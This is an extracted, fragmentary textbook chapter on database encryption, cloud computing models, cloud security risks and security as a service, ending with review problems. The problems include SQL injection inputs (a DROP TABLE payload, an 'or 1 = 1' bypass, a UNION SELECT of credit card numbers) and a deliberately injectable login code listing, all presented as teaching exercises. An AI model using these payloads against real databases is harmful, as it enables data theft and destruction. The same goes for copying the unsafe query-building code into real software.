• Inflexibility: When part or all of the database is encrypted, it becomes more
[Word Count: 56]

Encryption can be applied to the entire database, at the record level (encrypt 
selected records), at the attribute level (encrypt selected columns), or at the level of 
the individual field.
[Word Count: 30]

A number of approaches have been taken to database encryption. In this 
section, we look at a representative approach for a multiuser database.
[Word Count: 23]

A DBMS is a complex collection of hardware and software. It requires a large 
storage capacity and requires skilled personnel to perform maintenance, disaster 
protection, update, and security. For many small and medium-sized organizations, 
an attractive solution is to outsource the DBMS and the database to a service 
provider. The service provider maintains the database off site and can provide high 
availability, disaster prevention, and efficient access and update. The main concern 
with such a solution is the confidentiality of the data.
[Word Count: 82]

A straightforward solution to the security problem in this context is to encrypt 
the entire database and not provide the encryption/decryption keys to the service 
provider. This solution by itself is inflexible. The user has little ability to access 
individual data items based on searches or indexing on key parameters, but rather 
would have to download entire tables from the database, decrypt the tables, and 
work with the results. To provide more flexibility, it must be possible to work with 
the database in its encrypted form.
[Word Count: 86]

An example of such an approach, depicted in Figure 5.9, is reported in 
[DAMI05] and [DAMI03]. A similar approach is described in [HACI02]. Four 
entities are involved:
[Word Count: 27]

• Data owner: An organization that produces data to be made available for
[Word Count: 13]

controlled release, either within the organization or to external users.
 
• User: Human entity that presents requests (queries) to the system. The user
[Word Count: 23]

could be an employee of the organization who is granted access to the database
[Word Count: 14]

Figure 5.9  A Database Encryption Scheme
[Word Count: 6]

178    Chapter 5 / Database and Cloud Security
[Word Count: 8]

via the server, or a user external to the organization who, after authentication, 
is granted access.
 
• Client: Front end that transforms user queries into queries on the encrypted
[Word Count: 29]

data stored on the server.
 
• Server: An organization that receives the encrypted data from a data owner
[Word Count: 18]

and makes them available for distribution to clients. The server could in 
fact be owned by the data owner but, more typically, is a facility owned and 
maintained by an external provider.
[Word Count: 32]

1.	 The user issues an SQL query for fields from one or more records with a
[Word Count: 16]

specific value of the primary key.
	
2.	 The query processor at the client encrypts the primary key, modifies the SQL
[Word Count: 20]

query accordingly, and transmits the query to the server.
	
3.	 The server processes the query using the encrypted value of the primary key
[Word Count: 23]

and returns the appropriate record or records.
	
4.	 The query processor decrypts the data and returns the results.
[Word Count: 18]

For example, consider this query, which was introduced in Section 5.1, on the 
database of Figure 5.4a:
[Word Count: 17]

SELECT Ename, Eid, Ephone
      FROM Employee
      WHERE Did = 15
[Word Count: 10]

Assume that the encryption key k is used and that the encrypted value of the 
department id 15 is E(k, 15) = 1000110111001110. Then the query processor at the 
client could transform the preceding query into
[Word Count: 36]

SELECT Ename, Eid, Ephone
      FROM Employee
      WHERE Did = 1000110111001110
[Word Count: 10]

This method is certainly straightforward but, as was mentioned, lacks flexibility. 
For example, suppose the Employee table contains a salary attribute and the user 
wishes to retrieve all records for salaries less than $70K. There is no obvious way to 
do this, because the attribute value for salary in each record is encrypted. The set 
of encrypted values do not preserve the ordering of values in the original attribute.
[Word Count: 69]

To provide more flexibility, the following approach is taken. Each record 
(row) of a table in the database is encrypted as a block. Referring to the abstract
[Word Count: 27]

(xi1, xi2, … , xiM) S [E(k, Bi), Ii1, Ii2, … , IiM]
[Word Count: 13]

For each row in the original database, there is one row in the encrypted 
database. The index values are provided to assist in data retrieval. We can proceed 
as follows. For any attribute, the range of attribute values is divided into a set of 
non-overlapping partitions that encompass all possible values, and an index value is 
assigned to each partition.
[Word Count: 60]

This arrangement provides for more efficient data retrieval. Suppose, for 
example, a user requests records for all employees with eid 6 300. The query 
processor requests all records with I(eid) … 2. These are returned by the server.
The query processor decrypts all rows returned, discards those that do not match 
the original query, and returns the requested unencrypted data to the user.
[Word Count: 63]

Figure 5.10  Encryption Scheme for Database of Figure 5.3
[Word Count: 9]

180    Chapter 5 / Database and Cloud Security
[Word Count: 8]

The indexing scheme just described does provide a certain amount 
of information to an attacker, namely a rough relative ordering of rows by a 
given attribute. To obscure such information, the ordering of indexes can 
be randomized. For example, the eid values could be partitioned by mapping 
[1, 200], [201, 400], [401, 600], [601, 800], and [801, 1000] into 2, 3, 5, 1, and 4, 
respectively. Because the metadata are not stored at the server, an attacker 
could not gain this information from the server.
[Word Count: 85]

Other features may be added to this scheme. To increase the efficiency of 
accessing records by means of the primary key, the system could use the encrypted 
value of the primary key attribute values, or a hash value. In either case, the row 
corresponding to the primary key value could be retrieved individually. Different 
portions of the database could be encrypted with different keys, so that users 
would only have access to that portion of the database for which they had the 
decryption key. This latter scheme could be incorporated into a role-based access 
control system.
[Word Count: 96]

There is an increasingly prominent trend in many organizations to move a substantial 
portion or even all information technology (IT) operations to an Internet-connected 
infrastructure known as enterprise cloud computing. The use of cloud computing 
raises a number of security issues, particularly in the area of database security. 
This section provides an overview of cloud computing. Section 5.9 discusses cloud 
computing security.
[Word Count: 62]

(b) Encrypted Employee Table with Indexes
[Word Count: 6]

E(k, B)
I(eid)
I(ename)
I(salary)
I(addr)
I(did)
[Word Count: 7]

Cloud computing: A model for enabling ubiquitous, convenient, on-demand 
network access to a shared pool of configurable computing resources (e.g., 
networks, servers, storage, applications, and services) that can be rapidly 
­provisioned and released with minimal management effort or service provider 
interaction. This cloud model promotes availability and is composed of five 
essential characteristics, three service models, and four deployment models.
[Word Count: 60]

NIST SP-800-145 (The NIST Definition of Cloud Computing) defines cloud com-
puting as follows:
[Word Count: 14]

The definition refers to various models and characteristics, whose relationship is 
illustrated in Figure 5.11. The essential characteristics of cloud computing include 
the following:
[Word Count: 24]

• Broad network access: Capabilities are available over the network and
[Word Count: 11]

accessed through standard mechanisms that promote use by heterogeneous 
thin or thick client platforms (e.g., mobile phones, laptops, and PDAs) as well 
as other traditional or cloud-based software services.
[Word Count: 29]

182    Chapter 5 / Database and Cloud Security
[Word Count: 8]

• Rapid elasticity: Cloud computing gives you the ability to expand and
[Word Count: 12]

reduce resources according to your specific service requirement. For ­example, 
you may need a large number of server resources for the duration of a specific 
task. You can then release these resources upon completion of the task.
 
• Measured service: Cloud systems automatically control and optimize
[Word Count: 46]

resource use by leveraging a metering capability at some level of abstraction 
appropriate to the type of service (e.g., storage, processing, bandwidth, and 
active user accounts). Resource usage can be monitored, controlled, and 
reported, providing transparency for both the provider and consumer of the 
utilized service.
 
• On-demand self-service: A consumer can unilaterally provision computing
[Word Count: 55]

capabilities, such as server time and network storage, as needed automatically 
without requiring human interaction with each service provider. Because 
the service is on demand, the resources are not permanent parts of your IT 
infrastructure.
 
• Resource pooling: The provider’s computing resources are pooled to serve
[Word Count: 46]

multiple consumers using a multi-tenant model, with different physical and 
virtual resources dynamically assigned and reassigned according to consumer 
demand. There is a degree of location independence in that the customer 
generally has no control or knowledge over the exact location of the provided 
resources, but may be able to specify location at a higher level of abstraction 
(e.g., country, state, or datacenter). Examples of resources include storage, 
processing, memory, network bandwidth, and virtual machines. Even private 
clouds tend to pool resources between different parts of the same organization.
[Word Count: 89]

NIST defines three service models, which can be viewed as nested service 
alternatives (Figure 5.12):
[Word Count: 15]

• Software as a service (SaaS): Provides service to customers in the form of
[Word Count: 14]

a platform on which the customer’s applications can run. PaaS enables the 
customer to deploy onto the cloud infrastructure customer-created or 
acquired applications. A PaaS cloud provides useful software building blocks, 
plus a number of development tools, such as programming languages, run-
time environments, and other tools that assist in deploying new applications 
In effect, PaaS is an operating system in the cloud. PaaS is useful for an 
organization that wants to develop new or tailored applications while paying
[Word Count: 79]

for the needed computing resources only as needed and only for as long as 
needed. Google App Engine and the Salesforce1 Platform from Salesforce.
com are examples of PaaS.
 
• Infrastructure as a service (IaaS): Provides the customer access to the underly-
[Word Count: 42]

ing cloud infrastructure. IaaS provides virtual machines and other abstracted 
hardware and operating systems, which may be controlled through a service 
application programming interface (API). IaaS offers the customer process-
ing, storage, networks, and other fundamental computing resources so that 
the customer is able to deploy and run arbitrary software, which can include 
operating systems and applications. IaaS enables customers to combine basic 
computing services, such as number crunching and data storage, to build highly 
adaptable computer systems. Examples of IaaS are Amazon Elastic Compute 
Cloud (Amazon EC2) and Windows Azure.
[Word Count: 91]

• Public cloud: The cloud infrastructure is made available to the general public
[Word Count: 13]

or a large industry group and is owned by an organization selling cloud 
services. The cloud provider is responsible both for the cloud infrastructure 
and for the control of data and operations within the cloud.
[Word Count: 35]

Cloud Platform
(visible only to provider)
[Word Count: 6]

Cloud Application Software
(provided by cloud, visible to subscriber)
[Word Count: 9]

184    Chapter 5 / Database and Cloud Security
[Word Count: 8]

• Private cloud: The cloud infrastructure is operated solely for an organization.
[Word Count: 12]

It may be managed by the organization or a third party and may exist on 
premise or off premise. The cloud provider is responsible only for the 
infrastructure and not for the control.
 
• Community cloud: The cloud infrastructure is shared by several organizations
[Word Count: 44]

and supports a specific community that has shared concerns (e.g., mission, 
security requirements, policy, and compliance considerations). It may be 
managed by the organizations or a third party and may exist on premise or  
off premise.
 
• Hybrid cloud: The cloud infrastructure is a composition of two or more
[Word Count: 49]

clouds (private, community, or public) that remain unique entities but  
are bound together by standardized or proprietary technology that enables 
data and application portability (e.g., cloud bursting for load balancing 
between clouds).
[Word Count: 32]

Figure 5.13 illustrates the typical cloud service context. An enterprise maintains 
workstations within an enterprise LAN or set of LANs, which are connected by a
[Word Count: 25]

NIST developed the reference architecture with the following objectives in mind:
[Word Count: 11]

• To illustrate and understand the various cloud services in the context of an
[Word Count: 14]

overall cloud computing conceptual model.
 
• To provide a technical reference for consumers to understand, discuss, catego-
[Word Count: 17]

rize, and compare cloud services.
 
• To facilitate the analysis of candidate standards for security, interoperability,
[Word Count: 16]

and portability and reference implementations.
[Word Count: 5]

The reference architecture, depicted in Figure 5.14, defines five major actors 
in terms of the roles and responsibilities:
[Word Count: 18]

• Cloud consumer:  A person or organization that maintains a business relation-
[Word Count: 12]

ship with, and uses service from, cloud providers.
 
• Cloud provider (CP):  A person, organization, or entity responsible for mak-
[Word Count: 20]

ing a service available to interested parties.
 
• Cloud auditor:  A party that can conduct independent assessment of cloud
[Word Count: 19]

services, information system operations, performance, and security of the 
cloud implementation.
 
• Cloud broker:  An entity that manages the use, performance and delivery of
[Word Count: 24]

cloud services, and negotiates relationships between CPs and cloud consumers.
 
• Cloud carrier:  An intermediary that provides connectivity and transport of
[Word Count: 21]

cloud services from CPs to cloud consumers.
[Word Count: 7]

The roles of the cloud consumer and provider have already been discussed. To 
summarize, a cloud provider can provide one or more of the cloud services to meet 
IT and business requirements of cloud consumers. For each of the three service
[Word Count: 41]

router through a network or the Internet to the cloud service provider. The cloud 
service provider maintains a massive collection of servers, which it manages with a 
variety of network management, redundancy, and security tools. In the figure, the 
cloud infrastructure is shown as a collection of blade servers, which is a common 
architecture.
[Word Count: 54]

NIST SP 500-292 (NIST Cloud Computing Reference Architecture) establishes a ref-
erence architecture described as follows:
[Word Count: 16]

The NIST cloud computing reference architecture focuses on the requirements 
of “what” cloud services provide, not a “how to” design solution and implemen-
tation. The reference architecture is intended to facilitate the understanding of 
the operational intricacies in cloud computing. It does not represent the system 
architecture of a specific cloud computing system; instead it is a tool for describ-
ing, discussing, and developing a system-specific architecture using a common 
framework of reference.
[Word Count: 73]

186    Chapter 5 / Database and Cloud Security
[Word Count: 8]

models (SaaS, PaaS, and IaaS), the CP provides the storage and processing facilities 
needed to support that service model, together with a cloud interface for cloud 
­service consumers. For SaaS, the CP deploys, configures, maintains, and updates the 
operation of the software applications on a cloud infrastructure so that the services 
are provisioned at the expected service levels to cloud consumers. The consumers 
of SaaS can be organizations that provide their members with access to software 
applications, end users who directly use software applications, or software applica-
tion administrators who configure applications for end users.
[Word Count: 95]

For PaaS, the CP manages the computing infrastructure for the platform and 
runs the cloud software that provides the components of the platform, such as runt-
ime software execution stack, databases, and other middleware components. Cloud 
consumers of PaaS can employ the tools and execution resources provided by CPs to 
develop, test, deploy, and manage the applications hosted in a cloud environment.
[Word Count: 62]

For IaaS, the CP acquires the physical computing resources underlying the 
service, including the servers, networks, storage, and hosting infrastructure. The 
IaaS cloud consumer in turn uses these computing resources, such as a virtual com-
puter, for their fundamental computing needs.
[Word Count: 41]

The cloud carrier is a networking facility that provides connectivity and trans-
port of cloud services between cloud consumers and CPs. Typically, a CP will set up 
service level agreements (SLAs) with a cloud carrier to provide services consistent 
with the level of SLAs offered to cloud consumers, and may require the cloud carrier 
to provide dedicated and secure connections between cloud consumers and CPs.
[Word Count: 65]

A cloud broker is useful when cloud services are too complex for a cloud con-
sumer to easily manage. Three areas of support can be offered by a cloud broker:
[Word Count: 30]

• Service intermediation:  These are value-added services, such as identity man-
[Word Count: 11]

agement, performance reporting, and enhanced security.
[Word Count: 6]

Service orchestration
Cloud
service
management
[Word Count: 5]

Figure 5.14  NIST Cloud Computing Reference Architecture
[Word Count: 7]

5.9 / CLOUD SECURITY RISKS AND COUNTERMEASURES   187
[Word Count: 8]

• Service aggregation:  The broker combines multiple cloud services to meet
[Word Count: 11]

consumer needs not specifically addressed by a single CP, or to optimize per-
formance or minimize cost.
 
• Service arbitrage:  This is similar to service aggregation except that the services
[Word Count: 30]

being aggregated are not fixed. Service arbitrage means a broker has the flexibil-
ity to choose services from multiple agencies. The cloud broker, for example, can 
use a credit-scoring service to measure and select an agency with the best score.
[Word Count: 40]

A cloud auditor can evaluate the services provided by a CP in terms of secu-
rity controls, privacy impact, performance, and so on. The auditor is an independent 
entity that can assure that the CP conforms to a set of standards.
[Word Count: 41]

5.9	 CLOUD SECURITY RISKS AND COUNTERMEASURES
[Word Count: 6]

In general terms, security controls in cloud computing are similar to the security 
controls in any IT environment. However, because of the operational models and 
technologies used to enable cloud service, cloud computing may present risks that 
are specific to the cloud environment. The essential concept in this regard is that 
the enterprise loses a substantial amount of control over resources, services, and 
applications but must maintain accountability for security and privacy policies.
[Word Count: 73]

The Cloud Security Alliance [CSA10] lists the following as the top  
cloud-specific security threats:
[Word Count: 14]

• Abuse and nefarious use of cloud computing: For many CPs, it is relatively
[Word Count: 14]

relinquishes direct control over many aspects of security and, in doing so,
[Word Count: 12]

188    Chapter 5 / Database and Cloud Security
[Word Count: 8]

confers an unprecedented level of trust onto the CP. One grave concern is the 
risk of malicious insider activity. Cloud architectures necessitate certain roles 
that are extremely high-risk. Examples include CP system administrators and 
managed security service providers. Countermeasures include the following: 
(1) enforce strict supply chain management and conduct a comprehensive 
supplier assessment; (2) specify human resource requirements as part of 
legal contract; (3) require transparency into overall information security and 
management practices, as well as compliance reporting; and (4) determine 
security breach notification processes.
 
• Shared technology issues: IaaS vendors deliver their services in a scalable
[Word Count: 98]

security breach is the loss or leakage of data. We address this issue in the next 
section. Countermeasures include the following: (1) implement strong API 
access control; (2) encrypt and protect integrity of data in transit; (3) analyze 
data protection at both design and run time; and (4) implement strong key 
generation, storage and management, and destruction practices.
 
• Account or service hijacking: Account and service hijacking, usually with
[Word Count: 69]

stolen credentials, remains a top threat. With stolen credentials, attackers 
can often access critical areas of deployed cloud computing services, allowing 
them to compromise the confidentiality, integrity, and availability of those 
services. Countermeasures include the following: (1) prohibit the sharing of 
account credentials between users and services; (2) leverage strong two-factor 
authentication techniques where possible; (3) employ proactive monitoring to 
detect unauthorized activity; and (4) understand CP security policies and SLAs.
 
• Unknown risk profile: In using cloud infrastructures, the client necessarily
[Word Count: 82]

cedes control to the cloud provider on a number of issues that may affect 
security. Thus the client must pay attention to and clearly define the roles 
and responsibilities involved for managing risks. For example, employees may 
deploy applications and data resources at the CP without observing the normal 
policies and procedures for privacy, security, and oversight. Countermeasures 
include (1) disclosure of applicable logs and data; (2) partial/full disclosure of 
infrastructure details (e.g., patch levels and firewalls); and (3) monitoring and 
alerting on necessary information.
[Word Count: 85]

Similar lists have been developed by the European Network and Information 
Security Agency [ENIS09] and NIST [JANS11].
[Word Count: 17]

5.11 / Cloud Security as a Service   189
[Word Count: 8]

As can be seen from the previous section, there are numerous aspects to cloud 
security and numerous approaches to providing cloud security measures. A ­further 
example is seen in the NIST guidelines for cloud security, specified in SP-800-14  
and listed in Table 5.4. Thus, the topic of cloud security is well beyond the 
scope of this chapter. In this section, we focus on one specific element of cloud 
security.
[Word Count: 69]

There are many ways to compromise data. Deletion or alteration of records 
without a backup of the original content is an obvious example. Unlinking a record 
from a larger context may render it unrecoverable, as can storage on unreliable 
media. Loss of an encoding key may result in effective destruction. Finally, unau-
thorized parties must be prevented from gaining access to sensitive data.
[Word Count: 63]

The threat of data compromise increases in the cloud, due to the number of 
and interactions between risks and challenges that are either unique to the cloud or 
more dangerous because of the architectural or operational characteristics of the 
cloud environment.
[Word Count: 41]

Data must be secured while at rest, in transit, and in use, and access to the 
data must be controlled. The client can employ encryption to protect data in transit, 
though this involves key management responsibilities for the CP. The client can 
enforce access control techniques but, again, the CP is involved to some extent 
depending on the service model used.
[Word Count: 61]

For data at rest, the ideal security measure is for the client to encrypt the 
database and only store encrypted data in the cloud, with the CP having no access 
to the encryption key. So long as the key remains secure, the CP has no ability to 
read the data, although corruption and other denial-of-service attacks remain a 
risk.The model depicted in Figure 5.9 works equally well when the data is stored 
in a cloud.
[Word Count: 75]

The term security as a service has generally meant a package of security services 
offered by a service provider that offloads much of the security responsibility 
from an enterprise to the security service provider. Among the services typically 
­provided are authentication, anti-virus, antimalware/spyware, intrusion detection,
[Word Count: 45]

190    Chapter 5 / Database and Cloud Security
[Word Count: 8]

Table 5.4  NIST Guidelines on Cloud Security and Privacy Issues and Recommendations
[Word Count: 12]

Governance
Extend organizational practices pertaining to the policies, procedures, and standards used for application 
development and service provisioning in the cloud, as well as the design, implementation, testing, use, and 
monitoring of deployed or engaged services.
[Word Count: 36]

Put in place audit mechanisms and tools to ensure organizational practices are followed throughout the 
system lifecycle.
[Word Count: 17]

Compliance
Understand the various types of laws and regulations that impose security and privacy obligations on the  
organization and potentially impact cloud computing initiatives, particularly those involving data location,  
privacy and security controls, records management, and electronic discovery requirements.
[Word Count: 39]

Review and assess the cloud provider’s offerings with respect to the organizational requirements to be met 
and ensure that the contract terms adequately meet the requirements. Ensure that the cloud provider’s electronic 
discovery capabilities and processes do not compromise the privacy or security of data and applications.
[Word Count: 47]

Trust
Ensure that service arrangements have sufficient means to allow visibility into the security and privacy 
controls and processes employed by the cloud provider, and their performance over time.
[Word Count: 29]

Establish clear, exclusive ownership rights over data.
Institute a risk management program that is flexible enough to adapt to the constantly evolving and  
shifting risk landscape for the lifecycle of the system.
[Word Count: 32]

Continuously monitor the security state of the information system to support ongoing risk management  
decisions.
[Word Count: 15]

Architecture
Understand the underlying technologies that the cloud provider uses to provision services, including the  
implications that the technical controls involved have on the security and privacy of the system, over the full 
system lifecycle and across all system components.
[Word Count: 40]

Identity and access management
Ensure that adequate safeguards are in place to secure authentication, authorization, and other identity and 
access management functions, and are suitable for the organization.
[Word Count: 28]

Software isolation
Understand virtualization and other logical isolation techniques that the cloud provider employs in its multi-
tenant software architecture, and assess the risks involved for the organization.
[Word Count: 28]

Data protection
Evaluate the suitability of the cloud provider’s data management solutions for the organizational data 
concerned and the ability to control access to data, to secure data while at rest, in transit, and in use, and to  
sanitize data.
[Word Count: 40]

Take into consideration the risk of collating organizational data with those of other organizations whose 
threat profiles are high or whose data collectively represent significant concentrated value.
[Word Count: 27]

Fully understand and weigh the risks involved in cryptographic key management with the facilities 
available in the cloud environment and the processes established by the cloud provider.
[Word Count: 27]

Availability
Understand the contract provisions and procedures for availability, data backup and recovery, and disaster 
recovery, and ensure that they meet the organization’s continuity and contingency planning requirements.
[Word Count: 28]

Ensure that during an intermediate or prolonged disruption or a serious disaster, critical operations can be 
immediately resumed, and that all operations can be eventually reinstituted in a timely and organized manner.
[Word Count: 32]

Incident response
Understand the contract provisions and procedures for incident response and ensure that they meet the 
requirements of the organization.
[Word Count: 21]

Ensure that the cloud provider has a transparent response process in place and sufficient mechanisms to 
share information during and after an incident.
[Word Count: 23]

Ensure that the organization can respond to incidents in a coordinated fashion with the cloud provider in 
accordance with their respective roles and responsibilities for the computing environment.
[Word Count: 28]

5.11 / Cloud Security as a Service   191
[Word Count: 8]

and security event management. In the context of cloud computing, cloud security 
as a service, designated SecaaS, is a segment of the SaaS offering of a CP.
[Word Count: 27]

The Cloud Security Alliance defines SecaaS as the provision of security 
applications and services via the cloud either to cloud-based infrastructure and 
software or from the cloud to the customers’ on-premise systems (Table 5.4) 
[CSA11b]. The Cloud Security Alliance has identified the following SecaaS cat-
egories of service:
[Word Count: 48]

• Identity and access management
 
• Data loss prevention
 
• Web security
 
• E-mail security
 
• Security assessments
 
• Intrusion management
 
• Security information and event management
 
• Encryption
 
• Business continuity and disaster recovery
 
• Network security
[Word Count: 38]

In this section, we examine these categories with a focus on security of the 
cloud-based infrastructure and services (Figure 5.15).
[Word Count: 20]

The access management portion of IAM involves authentication and access 
control services. For example, the CSP must be able to authenticate users in a 
trustworthy manner. The access control requirements in SPI environments include 
establishing trusted user profile and policy information, using it to control access 
within the cloud service, and doing this in an auditable way.
[Word Count: 57]

Data loss prevention (DLP) is the monitoring, protecting, and verifying the 
security of data at rest, in motion, and in use. Much of DLP can be implemented by 
the cloud client, such as discussed in Section 16.6. The CSP can also provide DLP 
services, such as implementing rules about what functions can be performed on data 
in various contexts.
[Word Count: 59]

Web security is real-time protection offered either on premise through software/
appliance installation or via the Cloud by proxying or redirecting Web traffic to 
the CP. This provides an added layer of protection on top of things like ­antiviruses 
to prevent malware from entering the enterprise via activities such as Web ­browsing.
[Word Count: 52]

192    Chapter 5 / Database and Cloud Security
[Word Count: 8]

In addition to protecting against malware, a cloud-based Web security service might 
include usage policy enforcement, data backup, traffic control, and Web access 
­control.
[Word Count: 24]

A CSP may provide a Web-based e-mail service, for which security measures 
are needed. E-mail security provides control over inbound and outbound email, 
protecting the organization from phishing, malicious attachments, enforcing corpo-
rate polices such as acceptable use and spam prevention. The CSP may also incorpo-
rate digital signatures on all e-mail clients and provide optional e-mail encryption.
[Word Count: 58]

Security assessments are third-part audits of cloud services. While this service 
is outside the province of the CSP, the CSP can provide tools and access points to 
facilitate various assessment activities.
[Word Count: 31]

Intrusion management encompasses intrusion detection, prevention, and 
response. The core of this service is the implementation of intrusion detection sys-
tems (IDSs) and intrusion prevention systems (IPSs) at entry points to the cloud 
and on servers in the cloud. An IDS is a set of automated tools designed to detect 
unauthorized access to a host system. We discuss this in Chapter 21. An IPS incor-
[Word Count: 65]

Identity and access management
Network security
[Word Count: 6]

Security assessments
Security information and
 
event management
Business continuity and
 
disaster recovery
[Word Count: 12]

Figure 5.15  Elements of Cloud Security as a Service
[Word Count: 9]

porates IDS functionality but also includes mechanisms designed to block traffic 
from intruders.
[Word Count: 13]

Security information and event management (SIEM) aggregates (via push or 
pull mechanisms) log and event data from virtual and real networks, applications, 
and systems. This information is then correlated and analyzed to provide real-time 
reporting and alerting on information/events that may require intervention or other 
type of response. The CSP typically provides an integrated service that can put 
together information from a variety of sources both within the cloud and within the 
client enterprise network.
[Word Count: 75]

Encryption is a pervasive service that can be provided for data at rest in the 
cloud, e-mail traffic, client-specific network management information, and iden-
tity information. Encryption services provided by the CSP involve a range of com-
plex issues, including key management, how to implement virtual private network 
(VPN) services in the cloud, application encryption, and data content access.
[Word Count: 59]

Business continuity and disaster recovery comprise measures and mecha-
nisms to ensure operational resiliency in the event of any service interruptions. 
This is an area where the CSP, because of economies of scale, can offer obvi-
ous benefits to a cloud service client [WOOD10]. The CSP can provide backup 
at multiple locations, with reliable failover and disaster recovery facilities. This 
service must include a flexible infrastructure, redundancy of functions and hard-
ware, monitored operations, geographically distributed data centers, and network 
survivability.
[Word Count: 81]

Network security consists of security services that allocate access, distribute, 
monitor, and protect the underlying resource services. Services include perimeter 
and server firewalls and denial-of-service protection. Many of the other services 
listed in this section, including intrusion management, identity and access manage-
ment, data loss protection, and Web security, also contribute to the network secu-
rity service.
[Word Count: 57]

[BERT05] is an excellent survey of database security. Two surveys of access con-
trol for database systems are [BERT95] and [LUNT90]. [VIEI05] analyzes ways 
to characterize and assess security mechanisms in database systems. [DISA05] is a 
lengthy discussion of database security topics, focusing on the features available in 
commercial DBMSs.
[Word Count: 50]

[CHAN12] and [SHAR13] are excellent overviews of SQLi attacks and 
countermeasures.
[Word Count: 11]

[FARK02] is a brief overview of the inference problem. For a brief but useful 
overview of databases, see [LEYT01]. The concepts on which relational databases 
are based were introduced in a classic paper by Codd [CODD70]. An early survey 
paper on relational databases is [KIM79].
[Word Count: 45]

[JANS11] is a worthwhile, systematic treatment of cloud security issues. Other 
useful treatments, providing differing perspectives, are [HASS10], [BALA09], 
[ANTH10], and [CSA11].
[Word Count: 22]

194    Chapter 5 / Database and Cloud Security
[Word Count: 8]

5.13	Key Terms, Review Questions, and Problems
[Word Count: 7]

attribute
blind SQL injection
cascading authorizations
cloud auditor
cloud broker
cloud carrier
cloud computing
[Word Count: 14]

cloud consumer
cloud provider
cloud security as a service
[Word Count: 9]

(SecaaS)
community cloud
compromise
data swapping
[Word Count: 6]

database
database access control
database encryption
database management system
[Word Count: 9]

5.13 / Key Terms, Review Questions, and Problems   195
[Word Count: 9]

end-of-line comment
foreign key
hybrid cloud
inband attack
inference
inference channel
inferential attack
infrastructure as a service (Iaas)
multi-instance model
multi-tenant model
out-of-band attack
parameterized query insertion
[Word Count: 27]

partitioning
piggybacked queries
platform as a service (Paas)
primary key
private cloud
public cloud
query language
query set
relation
relational database
relational database manage-
[Word Count: 24]

run-time prevention
security as a service (SecaaS)
service aggregation
service arbitrage
service intermediation
software as a service (SaaS)
Structured Query Language
[Word Count: 21]

(SQL)
SQL injection (SQLi) attack
tautology
tuple
view
[Word Count: 8]

5.1	
Consider a simplified university database that includes information on courses (name, 
number, day, time, room number, max enrollment) and on faculty teaching courses 
and students attending courses. Suggest a relational database for efficiently managing 
this information.
	 5.2	
The following table below provides information on members of a mountain climbing club.
[Word Count: 51]

Climber-ID
Name
Skill Level
Age
123
Edmund
Experienced
80
214
Arnold
Beginner
25
313
Bridget
Experienced
33
212
James
Medium
27
[Word Count: 21]

The primary key is Climber-ID. Explain whether or not each of the following rows can 
be added to the table.
[Word Count: 20]

196    Chapter 5 / Database and Cloud Security
[Word Count: 8]

5.3	
The following table shows a list of pets and their owners that is used by a veterinarian 
service.
[Word Count: 19]

P_Name
Type
Breed
DOB
Owner
O_Phone
O_Email
Kino
Dog
Std. Poodle
3/27/97
M. Downs
5551236
md@abc.com
Teddy
Cat
Chartreaux
4/2/98
M. Downs
1232343
md@abc.com
Filo
Dog
Std. Poodle
2/24/02
R. James
2343454
rj@abc.com
AJ
Dog
Collie Mix
11/12/95
Liz Frier
3456567
liz@abc.com
Cedro
Cat
Unknown
12/10/96
R. James
7865432
rj@abc.com
Woolley
Cat
Unknown
10/2/00
M. Trent
9870678
mt@abc.com
Buster
Dog
Collie
4/4/01
Ronny
4565433
ron@abc.com
[Word Count: 65]

a.	 Describe four problems that are likely to occur when using this table.
b.	 Break the table into two tables in a way that fixes the four problems. 
	 5.4	
We wish to create a student table containing the student’s ID number, name, and 
telephone number. Write an SQL statement to accomplish this.
	 5.5	
Consider an SQL statement:
	
	
SELECT id, forename, surname FROM authors WHERE forename = ‘john’ AND 
surname = ‘smith’
a.	 What is this statement intended to do?
b.	 Assume that the forename and surname fields are being gathered from user-­
[Word Count: 92]

supplied input, and suppose the user responds with:
	
Forename: jo’hn
	
Surname: smith
	
What will be the effect?
c.	 Now suppose the user responds with:
	
Forename: jo’; drop table authors--
	
Surname: smith
	
What will be the effect?
	 5.6	
Figure 5.16 shows a fragment of code that implements the login functionality for a 
database application. The code dynamically builds an SQL query and submits it to a 
database.
a.	 Suppose a user submits login, password, and pin as doe, secret, and 123. Show the
[Word Count: 82]

SQL query that is generated.
b.	 Instead, the user submits for the login field the following:
	
’ or 1 = 1 - -
	
What is the effect?
[Word Count: 27]

1.	String login, password, pin, query
2.	login = getParameter(“login”);
3.	password = getParameter(“pass”);
3.	pin = getParameter(“pin”);
4.	Connection conn.createConnection(“MyDataBase”);
5.	query = “SELECT accounts FROM users WHERE login=’” +
6.		
login + “‘AND pass=’” + password +
7.		
“‘AND pin=” + pin;
8.	ResultSet result = conn.executeQuery(query);
9.	if (result!=NULL)
10		
displayAccounts(result);
11	else
12		
displayAuthFailed();
[Word Count: 58]

Figure 5.16  Code for Generating an SQL Query
[Word Count: 8]

5.13 / Key Terms, Review Questions, and Problems   197
[Word Count: 9]

5.7	
The SQL command word UNION is used to combine the result sets of 2 or more SQL 
SELECT statements. For the login code of Figure 5.16, suppose a user enters the fol-
lowing into the login field:
	
	
’UNION SELECT cardNo from CreditCards where acctNo = 10032 - -
	
	
What is the effect?
	 5.8	
Assume that A, B, and C grant certain privileges on the employee table to X, who 
in turn grants them to Y, as shown in the following table, with the numerical entries 
indicating the time of granting:
[Word Count: 91]

UserID
Table
Grantor
READ
INSERT
DELETE
X
Employee
A
15
15
—
X
Employee
B
20
—
20
Y
Employee
X
25
25
25
X
Employee
C
30
—
30
[Word Count: 30]

Figure 5.18  Bob Revokes Privilege from David, Second Version
[Word Count: 9]

At time t = 35, B issues the command REVOKE ALL RIGHTS ON Employee 
FROM X. Which access rights, if any, of Y must be revoked, using the conventions 
defined in Section 5.2?
[Word Count: 33]

5.9	
Figure 5.17 shows a sequence of grant operations for a specific access right on a table. 
Assume that at t = 70, B revokes the access right from C. Using the conventions 
defined in Section 5.2, show the resulting diagram of access right dependencies.
[Word Count: 45]

5.10	
Figure 5.18 shows an alternative convention for handling revocations of the type 
illustrated in Figure 5.6.
[Word Count: 17]

198    Chapter 5 / Database and Cloud Security
[Word Count: 8]

a.	 Describe an algorithm for revocation that fits this figure.
b.	 Compare the relative advantages and disadvantages of this method to the original
[Word Count: 23]

5.11	
Consider the parts department of a plumbing contractor. The department maintains 
an inventory database that includes parts information (part number, description, 
color, size, number in stock, etc.) and information on vendors from whom parts are 
obtained (name, address, pending purchase orders, closed purchase orders, etc.). 
In an RBAC system, suppose that roles are defined for accounts payable clerk, an 
